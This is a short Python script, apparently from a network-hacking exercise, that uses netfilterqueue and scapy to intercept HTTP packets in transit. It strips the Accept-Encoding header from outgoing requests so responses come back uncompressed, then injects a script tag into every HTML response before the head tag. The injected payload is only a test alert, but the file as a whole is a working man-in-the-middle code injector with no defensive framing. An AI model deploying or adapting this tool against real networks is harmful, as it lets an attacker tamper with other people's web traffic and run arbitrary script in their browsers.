#!/usr/bin/env python

import netfilterqueue
import scapy.layers.inet as inet
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[inet.IP].len
    del packet[inet.IP].chksum
    del packet[inet.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = inet.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
        load = scapy_packet[scapy.Raw].load.decode()
        if scapy_packet[inet.TCP].dport == 80:
            print("Request:")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[inet.TCP].sport == 80:
            print("Response:")
            load = load.replace("<head>", "<script>alert('test');</script><head>")

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nExiting script...")
